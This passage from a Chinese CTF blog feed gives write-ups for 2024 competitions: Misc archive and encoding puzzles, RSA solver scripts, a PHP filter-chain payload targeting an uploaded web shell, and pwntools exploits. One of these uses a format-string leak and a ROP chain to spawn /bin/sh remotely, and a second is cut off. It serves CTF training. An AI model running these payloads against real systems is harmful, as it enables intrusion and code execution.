long_to_bytes(m)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag1+flag2)</span><br></pre></td></tr></table></figure>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/12/15/uDFe4PfsX952oME.png"
                        alt=""
                 ></p>
<p>注意脚本中ans的中正的数字是下面第34行的p值</p>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>2024 睿抗 Misc方向 全WriteUp</title>
    <url>//post/2024Raicom/</url>
    <content><![CDATA[<p><s>全国睿抗机器人大赛-网络安全方向</s> 黑盒原题赛 Misc方向全WP</p>
<p>锐评：排名是看不到的，题目是奇安信杯的，flag是不改的，非预期是可以秒的，拿血是看手速的（为什么Lunatic又比我快一秒，我的二血啊啊啊）</p>
<h3 id="你是黑客么">你是黑客么</h3>
<p>打开压缩包发现有密码，纯数字爆破得到密码</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241019130216341.png"
                        alt="image-20241019130216341"
                 ></p>
<p>010打开发现一个PK头</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241019130408645.png"
                        alt="image-20241019130408645"
                 ></p>
<p>复制到CyberChef中解base64，然后是一张png文件</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241019130533925.png"
                        alt="image-20241019130533925"
                 ></p>
<p>扫码得到flag</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241019130633439.png"
                        alt="image-20241019130633439"
                 ></p>
<p><code>flag&#123;asdf%^&amp;*ghjkl&#125;</code></p>
<h3 id="循环的压缩包">循环的压缩包</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;tarfile&quot;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">        </span><br><span class="line">    zip_data = data[<span class="number">512</span>:]</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;new.zip&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.write(zip_data)</span><br><span class="line">        </span><br><span class="line">    os.mkdir(<span class="string">&quot;tmp&quot;</span>)</span><br><span class="line">    archive_file = <span class="string">&quot;new.zip&quot;</span></span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(archive_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_ref:</span><br><span class="line">        zip_ref.extractall(path=<span class="string">&quot;tmp/&quot;</span>)</span><br><span class="line">        os.system(<span class="string">&quot;mv tmp/* .&quot;</span>)</span><br><span class="line">        os.rmdir(<span class="string">&quot;tmp&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>写个脚本，flag直接出<code>flag&#123;01af9cbb-6bf2-4ad8-8ecb-9dcbbc02bf19&#125;</code></p>
<h3 id="Goodtime">Goodtime</h3>
<p>打开压缩包发现有密码，纯小写字母爆破得到密码<code>city</code></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241019132740995.png"
                        alt="image-20241019132740995"
                 ></p>
<p>解压后发现有一大堆TXT文件</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241019132826320.png"
                        alt="image-20241019132826320"
                 ></p>
<p>发现qwsz.txt有一个03 04 14 00，补上文件头后，猜测所有文件合并起来是一个压缩包，然后就是要确定文件顺序</p>
<p>看到键盘上<code>qwsz</code>四个按键包围了A，同理<code>vghn</code>包围了B，猜测一共七个对应A-G，确定文件顺序后cyberchef提取压缩包，获得一张<code>owl.png</code>图片</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241019133049430.png"
                        alt="image-20241019133049430"
                 ></p>
<p>快进到得到flag</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241019133115344.png"
                        alt="image-20241019133115344"
                 ></p>
<blockquote>
<p>非预期：给qwsz.txt补上50 4B后直接CyberChef导出，使用BandZip解压，虽然会报错，但是依然可以忽略报错正常的拿出owl.png，然后正常LSB即可，因为隐写的数据比较少，集中在前面一部分，所以直接LSB也可以解出</p>
</blockquote>
<h3 id="Crypto-变异凯撒">Crypto - 变异凯撒</h3>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">115!111!111!155!1!515!1511!151511!15555!11555!15555!5515!15555!5515!15555!55551!11555!</span><br><span class="line">55551!11555!55111!11555!11115!55111!51111!55555!5515!15555!5515!15555!11111!11555!5555</span><br><span class="line">1!55551!1555!55555!11155!55555!1555!15555!11155!55555!55555!15555!55555!15555!55555!55</span><br><span class="line">555!11111!15555!15555!55555!11111!55555!51111!55551!5!15555!11111!55555!55551!55555!11</span><br><span class="line">115!55555!11555!15555!55555</span><br></pre></td></tr></table></figure>
<p>将<code>1</code>替换为<code>-</code>， <code>5</code>替换为<code>.</code>，<code>!</code>替换为(空格) ，然后<code>Morse Code</code></p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">GOODTRY!676F6F64747279215F6F60744B585B68556565506650514E6054595765</span><br></pre></td></tr></table></figure>
<p>后面那串拿去16进制转字符串</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">_o`tKX[hUeePfPQN`TYWe</span><br></pre></td></tr></table></figure>
<p>随波逐流一把梭<img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241019133420247.png"
                        alt="image-20241019133420247"
                 ></p>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>2024 台州市赛 部分WriteUp</title>
    <url>//post/2024tzctf/</url>
    <content><![CDATA[<h2 id="Web">Web</h2>
<h3 id="DEAD-OR-ALIVE">DEAD OR ALIVE</h3>
<p>php死亡绕过 php伪协议 url二次编码绕过一下</p>
<p>这里开启了短tag rot47绕不过去</p>
<p>换成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=upload/shell.php</span><br><span class="line">contents=?%3Chp%20phpipfn(o;)%3E?</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016122520194.png"
                        alt="image-20241016122520194"
                 ></p>
<h3 id="几道菜呀">几道菜呀</h3>
<p>robotstxt 泄露前半flag</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016122520194.png"
                        alt="image-20241016122938977"
                 ></p>
<p>后半flag变量覆盖 吧flag污染到变量world里面</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016123059656.png"
                        alt="image-20241016123059656"
                 ></p>
<h3 id="Crypto">Crypto</h3>
<h4 id="codemaster">codemaster</h4>
<p>爆破得到压缩包密码</p>
<p>hint里面看到压缩包密码</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016123701666.png"
                        alt="image-20241016123701666"
                 ></p>
<p>听出来摩斯编码</p>
<p>01 0100 0100 011 111 010 101 01 10 100 10 111 0110 0100 01 1011 11 01 101 0 0111 01 1010 101 01 100</p>
<p>001 0100 0100 1000解码得到压缩包密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALLWORKANDNOPLAYMAKEJACKADULLBOY</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016124350133.png"
                        alt="image-20241016124350133"
                 ></p>
<h4 id="简单的模运算">简单的模运算</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n1 =  <span class="number">59291291447490366931525634934604732490686993375526804349191888372804657968568621876626267171031639542229776816809231575682674990669907844507573323062869697381007018170369953528533225693260962158277876389797698421883811693774623191453338343873376809325940622690724742325375260783954612111771505452790833107433</span></span><br><span class="line">e1 =  <span class="number">1009</span></span><br><span class="line">e2 =  <span class="number">661</span></span><br><span class="line">c1 =  <span class="number">42985353077188042701858678659683858628193880095538312019081971299029326751867795460043384534976482867850898695817341887974850615883707385265375936859975562647458644154098813749248370155445911231152202411316142174083125556302740642264129017638217154099365335103116579136478977445028803457714891387414804454563</span></span><br><span class="line">hint2 =  <span class="number">40507463249661310357827794806044375677878316124571340628557074423085821966799760539750240709046644351970536177027127843527257097695964926292300842488261880439240179761636200128317742727421272586463218228015921971356760958631902559531017704907319793768862467740343002694370348402368271531907359292269313167594</span></span><br><span class="line">hint1 =  <span class="number">1271005879853316066661199285969179445258555468409602536767308127422453124456569166278548456389424001236622134198431700958874184560969387121822195176467698604581027381830540104701755158555395105056691597754287953054854072522855420859550987917092786677237411037800799757596145745139003994853090852244952501770</span></span><br><span class="line"></span><br><span class="line">p=GCD(n1, hint1**e1-e1**(e1*e2)*hint2**e2)</span><br><span class="line"></span><br><span class="line">m=<span class="built_in">pow</span>(c1, inverse(<span class="number">65537</span>, p-<span class="number">1</span>),p)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n2 =  <span class="number">18907964900655384324579822409386633636878766956056871585535362235214353767231073564264059287914388330411792102199606677008933621408085966756951588469677351070820733406746369679198435269992553170199992317543151904463295431360000467944654613563212110648427484740736780335622922770497302516605477200091994280170659051797483082932715112295285374951466772664058673174457133774539371864037823431076085535646866492867565053211399132137624309571702027870497719709848105717638061824558263209029252939242634210549580025431343041421766587111257036497372428545483704784943228958032869014014563237034417269447643411742587366522581092247139356905151503074118950953726319892565456479517718514001822091970116274032235077283171573739409327260871369017093426482435098823654221146125974831336950435699141428482689352594911360748437075413924102074118643817682988301168832491421799525827632647293700871699768251822202064478207264310344710162587091114198326722398521534722836191900118919600325987668228334387274131745452370144048469165896152934265086085786170745300044244328435656038364921390878141315764940004361350568616343868964642155971232793094529961537868556317288317761237430569785361173933724010332338240102029231307867651913780873895463922404696220328907265969090667253011075715302423364798124784791540343259221981176571491275777227356362593241763735078774750032170810209648159443012857333801615838630780060716065099646497273032317098446052746729617067928763959393487041510168193671378036773409927475705441371588922269531683087325413686315760604906941830110671649667896262119795185372459800672732201403353796496975239081396680894282951703497436899157694531797901273547022181574313676236049710129802224469486290831758140772148263506850711301689866687921384434558768919627058698246307704127709329632785782812326088967419473252484748677712381933762265715476433475653</span></span><br><span class="line">hint3 =  <span class="number">9939018467626296300864549557153960485816202060115441771858993139956001568094397129213688325169848929397519454556265038265085753791012239390847499832076142790537570688728474176390891119329028306138917962137940523721411683756694953004757356322832322272044727574511946615053360780724964403109981221038321150251912087095566788471973368735984926133539004913163814796547521685779553548417828006578689568287135076606657942555780079060666398892624634539284576783451146414121481315811210373744629102035041262128288541384833388244359092650525684510233998198648220188818529696044589322103131713532522087913277853687802387823370812184861308056607206704924142111163623647400386387795315156552323415775302567837608141240660791558895222250523472575523943334805729177781503647940132538364353380916295244903544529895988952519161034077133368918033027698840291604695794239996491625350827193007237672555853711676946280455422865857083520387962904612732978811244632662722516874510663815000407442709650546583427701935634421822920667340400344464560819496241832753100346158973730178944583819434570015364985334123682718945396012714833234814138060680879946683598382558581755464432848629830671740874556822495651590292355132309556201503702994218748824342270746121842337819752324099307642066174745872761074064496053960340396957873940843698476902239785513353538575271300199803656708789414583304212919858466476111752009816249691548012011325635726932007337584928654763601504911235883280784689919453164650180423494792012285026508211938647974660637499188015435581876228505538395991613265963363970634342709084117396030961729066498695271401095219781344237736883159601430790828530656828799412179649742014177933116928065839153385688599329261957525423958781720021524864279277040500534782586037303978447982579881703150864520067784227584088469267877647284326147128663307302461696049106379396</span></span><br><span class="line">hint4 =  <span class="number">11497927853957540365332790665731275206952151206861039571536392062632509295957449992678521695139160324432572043863866571073273424766195027066994928026020365890447586873438730677930838694248463784234422970896904779315141100899548415386962349420861970235250438845409060098489028828677789310690303276268227293420117427555062211347687022376226002772552572846005575907377875069559346178573605837280707896716903996273437999304784804469148200034055401729899984732371826562249893238400736560876412526076698397150716407768045925783960626076975474775287357623238930181817744888057241082587725853888247069373763616410186825446631363893872367121719099675878971215427631753890480342562281509217650841316549477101278836516712239644946591434882047908159355119724740895836970093220436696609508084144405957119864577550601265078506824881563233145601502789276574964256487656042156050790935757687533400014492738943377035151940053902285169162559415884261670006407914345470020985548114750984409094762491065523701667910143102554492295526746294891248183460488516919232107982441935261002056298051839186448002917036315086702724337403007094283544108605752353892969499338937456927473502637574082273446631592875576206457590873417790534425052375523311069970894661662935504029122498888677579838832589434264156033809784824308541883139057067073172969579383284214906496081973100504512465134008311849499410830926217663692810810073433508445528894019031624950077917834721653995486872359322444973369269957808220204120434820049177595069822767774880891475045042506316778272385296785381694201967451988353025446019210309412684814041807087081841227290094176745748423008005181412793105824372881451510867905760386180468940263583834371726883151840358399349831450242497969453799407724511831157375792268531837507107779497339624673256413930993867285692700231244480782493119378673295412687014852050209</span></span><br><span class="line">hint5 =  <span class="number">734693499178140709107482184121639881311481497449164451247514670640712514605734040224535011153519609835276802031782238154113623838563165860055971999265801692161249909520059287311664417036724025637099701450424590923727907132999019020950844342934742235333060614209179570928227493575110697506644022234765949969346518432653798426853947974772328105759741384608693269694</span></span><br><span class="line"></span><br><span class="line">q2=GCD(n2, hint3-hint4)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(q2)</span><br><span class="line">p2q2=GCD(n2,hint4-q2-hint3)</span><br><span class="line">r=n2//p2q2</span><br><span class="line"><span class="built_in">print</span>(r)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes((hint5-<span class="number">1</span>)//r**<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># DASCTF&#123;0e88f0e0-f18d-11ee-a56a-38f3abddb69b&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="Misc">Misc</h3>
<h4 id="大ping特ping">大ping特ping</h4>
<p>CTF-NetA一把梭</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016112455975.png"
                        alt="image-20241016112455975"
                 ></p>
<h4 id="鼠标不妙题">鼠标不妙题</h4>
<p>打开后是300个套娃压缩包，写脚本提取</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_all</span>(<span class="params">zip_path, extract_to, root_directory</span>):</span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(zip_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_ref:</span><br><span class="line">        <span class="keyword">for</span> member <span class="keyword">in</span> zip_ref.namelist():</span><br><span class="line">            filename = os.path.basename(member)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> filename:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            source = zip_ref.<span class="built_in">open</span>(member)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                target_path = os.path.join(extract_to, <span class="built_in">str</span>(uuid.uuid4()) + <span class="string">&quot;_&quot;</span> + filename)</span><br><span class="line">                <span class="keyword">with</span> source, <span class="built_in">open</span>(target_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> target:</span><br><span class="line">                    shutil.copyfileobj(source, target)</span><br><span class="line">            <span class="keyword">except</span> RuntimeError:</span><br><span class="line">                <span class="comment"># 如果文件被加密，则将其保存到根目录下</span></span><br><span class="line">                target_path = os.path.join(root_directory, <span class="built_in">str</span>(uuid.uuid4()) + <span class="string">&quot;_&quot;</span> + filename)</span><br><span class="line">                <span class="keyword">with</span> source, <span class="built_in">open</span>(target_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> target:</span><br><span class="line">                    shutil.copyfileobj(source, target)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recursive_unzip</span>(<span class="params">directory, root_directory</span>):</span><br><span class="line">    <span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(directory):</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">            <span class="keyword">if</span> file.endswith(<span class="string">&#x27;.zip&#x27;</span>) <span class="keyword">and</span> <span class="keyword">not</span> file.endswith(<span class="string">&#x27;.dic&#x27;</span>):</span><br><span class="line">                file_path = os.path.join(root, file)</span><br><span class="line">                extract_to = os.path.join(root, os.path.splitext(file)[<span class="number">0</span>])</span><br><span class="line">                os.makedirs(extract_to, exist_ok=<span class="literal">True</span>)</span><br><span class="line">                extract_all(file_path, extract_to, root_directory)</span><br><span class="line">                recursive_unzip(extract_to, root_directory)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    start_directory = <span class="string">r&quot;\\?\C:\Users\67300\Downloads\11&quot;</span></span><br><span class="line">    recursive_unzip(start_directory, start_directory)</span><br></pre></td></tr></table></figure>
<p>查看python的报错信息和使用everything直接得到最内层的文件</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016121031728.png"
                        alt="image-20241016121031728"
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016121119612.png"
                        alt="image-20241016121119612"
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016121223773.png"
                        alt="image-20241016121223773"
                 ></p>
<p>每个压缩包下有一个.dic文件，应该密码就在这300个字典中</p>
<p>写python脚本提取这300个字典</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_zip</span>(<span class="params">zip_path, output_dir</span>):</span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(zip_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_ref:</span><br><span class="line">        <span class="keyword">with</span> tempfile.TemporaryDirectory() <span class="keyword">as</span> temp_dir:</span><br><span class="line">            zip_ref.extractall(temp_dir)</span><br><span class="line">            <span class="keyword">for</span> root, _, files <span class="keyword">in</span> os.walk(temp_dir):</span><br><span class="line">                <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">                    file_path = os.path.join(root, file)</span><br><span class="line">                    <span class="keyword">if</span> file.endswith(<span class="string">&#x27;.zip&#x27;</span>):</span><br><span class="line">                        extract_zip(file_path, output_dir)</span><br><span class="line">                    <span class="keyword">elif</span> file.endswith(<span class="string">&#x27;.dic&#x27;</span>):</span><br><span class="line">                        shutil.move(file_path, os.path.join(output_dir, file))</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&#x27;Extracted <span class="subst">&#123;file&#125;</span> to <span class="subst">&#123;output_dir&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            shutil.rmtree(temp_dir)</span><br><span class="line"></span><br><span class="line">zip_dir = <span class="string">&#x27;C:/Users/67300/Downloads/鼠标不妙题/&#x27;</span></span><br><span class="line">output_dir = <span class="string">&#x27;C:/Users/67300/Downloads/鼠标不妙题/111&#x27;</span></span><br><span class="line"></span><br><span class="line">os.makedirs(output_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(zip_dir):</span><br><span class="line">    <span class="keyword">if</span> filename.endswith(<span class="string">&#x27;.zip&#x27;</span>):</span><br><span class="line">        zip_path = os.path.join(zip_dir, filename)</span><br><span class="line">        extract_zip(zip_path, output_dir)</span><br><span class="line">    <span class="keyword">if</span> filename.endswith(<span class="string">&#x27;.zip&#x27;</span>):</span><br><span class="line">        zip_path = os.path.join(zip_dir, filename)</span><br><span class="line">        extract_zip(zip_path, output_dir)</span><br></pre></td></tr></table></figure>
<p>将300个字典合并成1个，然后跑字典爆破密码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">output_dir = <span class="string">&#x27;C:/Users/67300/Downloads/鼠标不妙题/111&#x27;</span></span><br><span class="line">combined_file_path = <span class="string">&#x27;C:/Users/67300/Downloads/鼠标不妙题/combined.dic&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(combined_file_path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> combined_file:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(output_dir):</span><br><span class="line">        <span class="keyword">if</span> filename.endswith(<span class="string">&#x27;.dic&#x27;</span>):</span><br><span class="line">            dic_file_path = os.path.join(output_dir, filename)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(dic_file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> dic_file:</span><br><span class="line">                content = dic_file.read()</span><br><span class="line">                combined_file.write(content)</span><br><span class="line">                combined_file.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;All .dic files have been combined into <span class="subst">&#123;combined_file_path&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><img  
                       lazyload
                       alt="image"
                       data-src="C:/Users/67300/AppData/Roaming/Typora/typora-user-images/image-20241016113045440.png"
                        alt="image-20241016113045440"
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016113315654.png"
                        alt="image-20241016113315654"
                 ></p>
<p>看了一下f_几就嵌套几层，可以直接用everything一把梭，找到文件，每个文件是base64的一段</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016113621322.png"
                        alt="image-20241016113621322"
                 ></p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016113824170.png"
                        alt="image-20241016113824170"
                 ></p>
<h3 id="Pwn">Pwn</h3>
<h4 id="book">book</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, timeout = <span class="number">5</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">binary = <span class="string">&#x27;./book&#x27;</span></span><br><span class="line">elf = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    libc = elf.libc</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">    host = <span class="string">&#x27;139.155.126.78&#x27;</span></span><br><span class="line">    port = <span class="string">&#x27;31248&#x27;</span></span><br><span class="line">    p = remote(host,port)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> delim, data:     p.sendlineafter(delim, data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> delim, data:     p.sendafter(delim, data)</span><br><span class="line">s   = <span class="keyword">lambda</span> data:            p.send(data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data:            p.sendline(data)</span><br><span class="line">ru  = <span class="keyword">lambda</span> delim, **kwargs: p.recvuntil(delim, **kwargs)</span><br><span class="line">io  = <span class="keyword">lambda</span>:                 p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt</span>(<span class="params">payload</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sa(<span class="string">b&quot;name:\n&quot;</span>, payload)</span><br><span class="line">    ru(<span class="string">b&quot;name is:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">payload</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    ru(<span class="string">b&quot;write\n&quot;</span>)</span><br><span class="line">    s(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    fmt(<span class="string">&quot;%8$p-%19$p-%13$p&quot;</span>)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">    codebase = <span class="built_in">int</span>(p.recvn(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x14a0</span></span><br><span class="line">    ru(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">    libc.address = <span class="built_in">int</span>(p.recvn(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x24083</span></span><br><span class="line">    ru(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">    canary = <span class="built_in">int</span>(p.recvn(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    system = libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    binsh = <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">    success(<span class="string">f&quot;libc: <span class="subst">&#123;libc.address:#x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    b = codebase + <span class="number">0x4068</span></span><br><span class="line">    pop_rdi_ret = codebase + <span class="number">0x0000000000001503</span></span><br><span class="line">    ret = pop_rdi_ret + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    pay = fmtstr_payload(<span class="number">6</span>, &#123;b : <span class="number">0x200</span>&#125;)</span><br><span class="line">    fmt(pay)</span><br><span class="line"></span><br><span class="line">    pay = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(canary) + p64(<span class="number">0</span>) + p64(ret) + p64(pop_rdi_ret) + p64(binsh) + p64(system) </span><br><span class="line">    attack(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    io()</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>
<h4 id="magic-fmt">magic_fmt</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, timeout = <span class="number">5</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">binary = <span class="string">&#x27;./magic_fmt&#x27;</span></span><br><span class="line">elf = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    libc = elf.libc</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">    host = <span class="string">&#x27;139.155.126.78&#x27;</span></span><br><span class="line">    port = <span class="string">&#x27;37023&#x27;</span></span><br><span class="line">    p = remote(host,port)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> delim, data:     p.sendlineafter(delim, data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> delim, data:     p.sendafter(delim, data)</span><br><span class="line">s   = <span class="keyword">lambda</span> data:            p.send(data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data:            p.sendline(data)</span><br><span class="line">ru  = <span class="keyword">lambda</span> 